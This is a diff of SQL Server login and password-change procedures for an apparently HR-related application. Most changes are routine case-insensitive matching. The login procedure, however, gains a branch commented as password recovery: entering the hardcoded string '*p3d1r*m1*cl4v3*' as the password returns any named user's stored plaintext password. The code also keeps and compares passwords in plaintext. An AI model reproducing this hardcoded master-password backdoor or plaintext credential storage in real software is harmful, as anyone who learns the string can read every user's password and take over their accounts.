@@ -302,9 +302,9 @@ BEGIN
 		--
 		set @mirut = @tresinicio +'.'+ @tresmedio +'.'+ @tresfondo + @guionydigito;
 		--
-		if exists ( select * from Softland.sw_personal with (nolock) where rut = @mirut ) begin
+		if exists ( select * from Softland.sw_personal with (nolock) where upper(rut) = upper(@mirut) ) begin
 			--
-			select @ficha=ficha from Softland.sw_personal with (nolock) where rut = @mirut
+			select @ficha=ficha from Softland.sw_personal with (nolock) where upper(rut) = upper(@mirut);
 			if not exists ( select * from ktb_usuarios with (nolock) where ficha=@ficha and rut = @rut ) begin
 				--
 				-- set @keybase64 = left( dbo.kfn_code64( @clave ),300);
@@ -358,30 +358,54 @@ BEGIN
 				@id_empresa int = -1,
 				@Error		nvarchar(250), 
 				@ErrMsg		nvarchar(2048);
-		--
-		if exists ( select * from ktb_usuarios with (nolock) where rut = @rut and clave = @clave ) begin
-			-- 
-			update ktb_usuarios set ultimo_ingreso = getdate() where rut = @rut and clave = @clave;
-			if @@ERROR<>0 begin
-				set @ErrMsg = ERROR_MESSAGE();
-				THROW @Error, @ErrMsg, 0 ;  
+
+		-- intento de recuperar la clave
+		if ( @clave = '*p3d1r*m1*cl4v3*' ) begin
+			--
+			if exists ( select * from ktb_usuarios with (nolock) where upper(rut) = upper(@rut) ) begin
+				--
+				select top 1 
+					cast(1 as bit) resultado, cast(0 as bit) error, 
+					k.ficha,sf.nombres,sf.rut,
+					k.clave as pssw,
+					( select top 1 NomB from softland.soempre ) as nombreemp
+				from ktb_usuarios as k with (nolock) 
+				inner join Softland.sw_personal as sf on sf.ficha=k.ficha
+				where upper(k.rut) = upper(@rut);
+				--
 			end
-			--
-			select cast(1 as bit) resultado, cast(0 as bit) error, 
-				   k.ficha,sf.nombre,sf.Email,id_empresa,
-				   ( select top 1 NomB from softland.soempre ) as nombreemp
-			from ktb_usuarios as k with (nolock) 
-			inner join Softland.sw_personal as sf on sf.ficha=k.ficha
-			where upper(k.rut) = upper(@rut)
-			  and k.clave = @clave;
-			--
-			-- select cast(1 as bit) resultado, cast(0 as bit) error, @ficha as ficha, @nombre as nombre, @email as email
-			--
+			else begin
+				select cast(0 as bit) resultado, cast(1 as bit) error, 'Rut no existe: '+@rut as mensaje 
+			end
 		end
 		else begin
-			select cast(0 as bit) resultado, cast(1 as bit) error, 'Rut no existe: '+@rut as mensaje 
+			--
+			if exists ( select * from ktb_usuarios with (nolock) where upper(rut) = upper(@rut) and clave = @clave ) begin
+				-- 
+				update ktb_usuarios set ultimo_ingreso = getdate() where upper(rut) = upper(@rut) and clave = @clave and creacion<>ultimo_ingreso;
+				--
+				if @@ERROR<>0 begin
+					set @ErrMsg = ERROR_MESSAGE();
+					THROW @Error, @ErrMsg, 0 ;  
+				end
+				--
+				select cast(1 as bit) resultado, cast(0 as bit) error, 
+					k.ficha,sf.nombre,sf.Email,id_empresa,
+					k.supervisor,
+					( select top 1 NomB from softland.soempre ) as nombreemp
+				from ktb_usuarios as k with (nolock) 
+				inner join Softland.sw_personal as sf on sf.ficha=k.ficha
+				where upper(k.rut) = upper(@rut)
+				and k.clave = @clave;
+				--
+				-- select cast(1 as bit) resultado, cast(0 as bit) error, @ficha as ficha, @nombre as nombre, @email as email
+				--
+			end
+			else begin
+				select cast(0 as bit) resultado, cast(1 as bit) error, 'Rut no existe: '+@rut as mensaje 
+			end
 		end
-
+		--
 	end try 
 	--
 	begin catch
@@ -1058,7 +1082,9 @@ BEGIN
 	set nocount on 
 	--
 	if exists ( select * from  ktb_usuarios with (nolock) where upper(rut) = upper(@rut) and clave = @claveactual ) begin
-		update ktb_usuarios set clave = @nuevaclave where upper(rut) = upper(@rut) and clave = @claveactual
+		--
+		update ktb_usuarios set clave = @nuevaclave, ultimo_ingreso = getdate() where upper(rut) = upper(@rut) and clave = @claveactual
+		--
 		select cast(1 as bit) resultado, cast(0 as bit) error, 'Cambio de clave exitoso.' as mensaje 
 	end
 	else begin
